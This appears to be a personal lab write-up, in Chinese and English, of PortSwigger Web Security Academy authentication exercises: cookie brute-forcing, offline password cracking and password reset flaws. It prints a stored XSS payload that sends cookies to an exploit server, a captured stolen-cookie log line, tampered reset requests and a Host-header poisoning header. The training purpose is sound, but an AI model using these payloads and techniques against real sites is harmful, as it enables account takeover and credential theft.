---
title: "Lab Other Mechanisms"
date: 2022-07-04T10:47:36+08:00
---

## Lab: Brute-forcing a stay-logged-in cookie

Your credentials: wiener:peter  
Victim's username: carlos  
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw;  
Inspecter自动用base64解开 wiener:51dc30ddc473d43a6011e9ebba6ca770   
其中md5('peter')=51dc30ddc473d43a6011e9ebba6ca770  

爆破cookie  
Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.  

    Hash: MD5
    Add prefix: carlos:
    Encode: Base64-encode

As the Update email button is only displayed when you access the /my-account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. On the Options tab, add a grep match rule to flag any responses containing the string Update email. Start the attack.   

## Lab: Offline password cracking


-    Your credentials: wiener:peter
-    Victim's username: carlos
-    贴心的提供了xss服务器exploit server

Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:   
```
<script>document.location='//exploit-XXXXX.web-security-academy.net/'+document.cookie</script>
```
在log里发现  
```
10.0.1.221      2022-07-04 07:15:58 +0000 "GET /secret=Z624gql0H30Vxh0ItRUVqjRshMd4KGuT;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
``` 
解开是carlos:26323c16d5f4dabff3bb136f2460a943  
在https://md5hashing.net/hash/md5/26323c16d5f4dabff3bb136f2460a943 获得明文onceuponatime  

##  Lab: Password reset broken logic

重制wiener的密码，拦截请求，修改用户名即可
```
temp-forgot-password-token=sPOfETbWOq9MGJq6gjk3sw4JEvpKDg2L&username=carlos&new-password-1=123456&new-password-2=123456
```

##  Lab: Password reset poisoning via middleware

学习Password reset poisoning  
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning  

推荐插件`Param Miner`  
https://github.com/PortSwigger/param-miner   
https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943   
https://portswigger.net/blog/practical-web-cache-poisoning   


拦截重置密码的请求,修改用户名，添加header
```
X-Forwarded-Host: exploit-XXXXX.web-security-academy.net
```


## Lab: Password brute-force via password change

替换用户名,利用重置密码爆破
```
username=carlos&current-password=12345678&new-password-1=123456&new-password-2=1234
```


